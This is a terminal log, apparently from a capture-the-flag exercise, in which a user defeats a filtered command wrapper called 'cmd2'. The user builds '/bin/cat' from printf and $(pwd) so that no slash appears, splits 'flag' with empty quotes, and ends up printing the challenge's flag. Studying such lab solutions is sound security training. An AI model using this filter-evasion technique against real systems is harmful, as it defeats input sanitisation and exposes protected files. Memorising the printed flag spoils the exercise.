cmd2@prowl:~$ ./cmd2 'echo $(printf %.1s $(pwd))'
echo $(printf %.1s $(pwd))
/
cmd2@prowl:~$ ./cmd2 'echo $(printf "%.1sbin" $(pwd))'
echo $(printf "%.1sbin" $(pwd))
/bin
cmd2@prowl:~$ ./cmd2 'echo $(printf "%.1sbin%.1sbash" $(pwd))'
echo $(printf "%.1sbin%.1sbash" $(pwd))
/binbash
cmd2@prowl:~$ ./cmd2 'echo $(printf "%1sbin%.1sbash" $(pwd))'
echo $(printf "%1sbin%.1sbash" $(pwd))
/home/cmd2binbash
cmd2@prowl:~$ ./cmd2 'echo $(printf "%.1sbin%.1sbash" $(pwd))'
echo $(printf "%.1sbin%.1sbash" $(pwd))
/binbash
cmd2@prowl:~$ ./cmd2 'echo $(printf "%.1sbin%.2sbash" $(pwd) $(pwd))'
echo $(printf "%.1sbin%.2sbash" $(pwd) $(pwd))
/bin/hbash
cmd2@prowl:~$ ./cmd2 'echo $(printf "%.1sbin%.1sbash" $(pwd) $(pwd))'
echo $(printf "%.1sbin%.1sbash" $(pwd) $(pwd))
/bin/bash
cmd2@prowl:~$ ./cmd2 '$(printf "%.1sbin%.1sbash" $(pwd) $(pwd)) f""lag'
$(printf "%.1sbin%.1sbash" $(pwd) $(pwd)) f""lag
/bin/bash: flag: Permission denied
cmd2@prowl:~$ ./cmd2 '$(printf "%.1sbin%.1scat" $(pwd) $(pwd)) f""lag'
$(printf "%.1sbin%.1scat" $(pwd) $(pwd)) f""lag
FuN_w1th_5h3ll_v4riabl3s_haha
